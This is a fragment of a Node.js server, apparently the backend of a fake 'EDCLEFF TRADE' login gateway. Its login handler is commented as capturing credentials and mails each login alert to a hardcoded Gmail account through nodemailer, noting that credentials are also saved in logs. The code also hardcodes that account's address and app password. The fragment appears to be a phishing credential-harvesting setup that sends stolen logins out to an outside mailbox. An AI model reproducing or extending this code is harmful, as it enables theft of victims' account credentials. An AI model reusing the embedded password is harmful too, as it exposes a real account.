...
// Gmail configuration with NEW App Password
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'edcleff0@gmail.com',
    pass: 'vlfutznohqkechoq'
  }
});
...
// LOGIN HANDLER - Captures credentials AND sends email
app.post('/login', async (req, res) => {
  ...
  // Send email notification to edcleff0@gmail.com
  const emailContent = `
🔐 EDCLEFF TRADE - New Login Alert 🔐
...
---
This is an automated alert from your EDCLEFF TRADE Gateway.
  `;
  
  try {
    await transporter.sendMail({
      from: '"EDCLEFF Gateway" <edcleff0@gmail.com>',
      to: 'edcleff0@gmail.com',
      subject: '🔐 New Login - EDCLEFF TRADE',
      text: emailContent
    });
    console.log('✅ EMAIL SENT to edcleff0@gmail.com');
  } catch (err) {
    console.log('❌ Email error:', err.message);
    console.log('✅ Credentials saved in logs above');
  }
...
app.listen(PORT, () => {
  ...
  console.log('📧 Email notifications will be sent to edcleff0@gmail.com');
});
